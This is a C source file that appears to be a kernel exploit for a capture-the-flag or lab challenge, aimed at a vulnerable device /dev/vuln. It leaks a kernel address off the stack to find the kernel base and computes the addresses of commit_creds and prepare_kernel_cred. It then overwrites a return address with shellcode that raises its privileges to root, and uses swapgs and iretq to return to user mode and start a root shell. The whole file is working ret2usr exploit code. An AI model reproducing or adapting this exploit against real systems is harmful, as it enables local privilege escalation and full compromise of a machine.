#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

void (*commit_creds)(void *);
void *(*prepare_kernel_cred)(void *);
long user_sp;

void shell(void) { system("/bin/sh"); }

void shellcode(void) {
  commit_creds(prepare_kernel_cred(0));
  asm volatile(".intel_syntax noprefix\n"
               "swapgs\n"
               "mov r15, 0x2b\n"
               "push r15\n"
               "mov r15, user_sp\n"
               "push r15\n"
               "mov r15, 0x246\n"
               "push r15\n"
               "mov r15, 0x33\n"
               "push r15\n"
               "lea r15, shell\n"
               "push r15\n"
               "iretq\n"
               ".att_syntax\n");
}

int main(void) {
  long buf[64];
  int fd = open("/dev/vuln", O_RDWR);
  assert(fd >= 0);
  read(fd, buf, sizeof(buf));
  for (size_t i = 0; i < sizeof(buf) / sizeof(buf)[0]; i++) {
    printf("[%zd] 0x%lx\n", i, buf[i]);
  }
  long kernel_base = buf[33] - 0xD76EC;
  printf("base = 0x%lx\n", kernel_base);
  commit_creds = (void *)(kernel_base + 0x55F00);
  prepare_kernel_cred = (void *)(kernel_base + 0x55DB0);
  user_sp = (long)buf;
  buf[35] = (long)shellcode;
  write(fd, buf, sizeof(buf));
}